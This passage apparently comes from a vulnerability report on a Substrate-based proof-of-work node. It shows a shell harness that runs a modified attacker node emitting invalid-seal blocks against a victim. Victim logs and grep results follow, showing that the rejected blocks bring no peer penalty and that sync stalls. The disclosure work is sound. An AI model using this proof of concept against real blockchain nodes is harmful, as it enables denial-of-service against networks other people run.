  QPOC_EVIL_SEAL=1 RUST_LOG=info "$EVIL" --chain "$SPEC" --base-path "$A_PATH" \
    --port "$A_P2P" --rpc-port "$A_RPC" --no-mdns --no-telemetry --no-prometheus \
    --unsafe-force-node-key-generation --rpc-methods unsafe --rpc-cors all \
    --validator --force-authoring --rewards-inner-hash "$INNER" \
    "${EXTRA[@]}" --name ATTACKER >> "$OUT/attacker.log" 2>&1 &
  A_PID=$!; wait_rpc "$A_RPC"; A_PEER=$(rpc $A_RPC system_localPeerId | jq_ result)
}

# PHASE 2 attach — V dials A (A cannot dial out on this backend):
rpc $V_RPC system_addReservedPeer "[\"/ip4/127.0.0.1/tcp/$A_P2P/p2p/$A_PEER\"]"
# PHASE 3 detach:
rpc $V_RPC system_removeReservedPeer "[\"$A_PEER\"]"; stop_attacker; start_attacker isolated
```

**Rejections observed on V** (plain `info` level):

```
16:44:12 Invalid Seal [255, 0, 0, 0, ... 189, 123, 227, 42] for parent hash 0x81959dc9...51ac
16:44:12 💔 Error importing block 0x0e735289...85d3: consensus error: Import failed: PoW validation error: invalid seal
16:45:20 💔 Error importing block 0xba49b409...27f3: block has an unknown parent
16:46:27 💔 Error importing block 0x03f336fe...8877: block has an unknown parent
```

Both `invalid seal` (`Other(_)`) and `unknown parent` (`UnknownParent`) land on the **same match arm** at `client/network-sync/src/strategy/chain_sync.rs:777-781` — the arm without `DropPeer`.

Note that of the 8 import errors in this phase, only 2 are `Invalid Seal`; the other 6 are `block has an unknown parent`, a downstream consequence of V never accepting A's chain. Both classes take the same no-`DropPeer` arm, which is the point, but the report's framing should not be read as 18 distinct seal failures.

**On peer reporting in this run** — a case-insensitive grep of V's log:

```
$ grep -icE "banned|report |reported|disconnecting|reputation" victim.log
1
$ grep -n "QmdWFG" victim.log
99:16:44:12 Report QmdWFG…: -2147483648 to -2147483648. Reason: Same block request multiple times. Banned, disconnecting.
```

Exactly one report in the whole run, and it is for **duplicate block requests**, not for any of the rejected blocks. None of the 8 import failures produced a reputation change, and the ban that did fire left A connected — `(2 peers)` persisted for the full 240 s (see §4). An earlier revision of this report claimed the grep "returns nothing"; that used a case-sensitive pattern that could not match `Report` /`Banned,`/`disconnecting.` and was wrong.

**Two measurement controls worth noting:**

* **Logging volume was ruled out as a cause.** An earlier run with V at `sync=debug` produced 240 MB in 68 s, which could plausibly slow a node by itself. The measurement run used plain `info` (27 KB total) and reproduced the stall, so the effect is not a logging artifact.
* **One log-derived figure is an artifact and must not be used.** At `info` level V stops emitting `🏆 Imported #N` lines once it enters major-sync (`⚙️ Syncing` replaces them) — 35 / 0 / 65 `Imported` lines across the three phases. The correct attack-phase figure is the RPC-derived **59**, not zero.
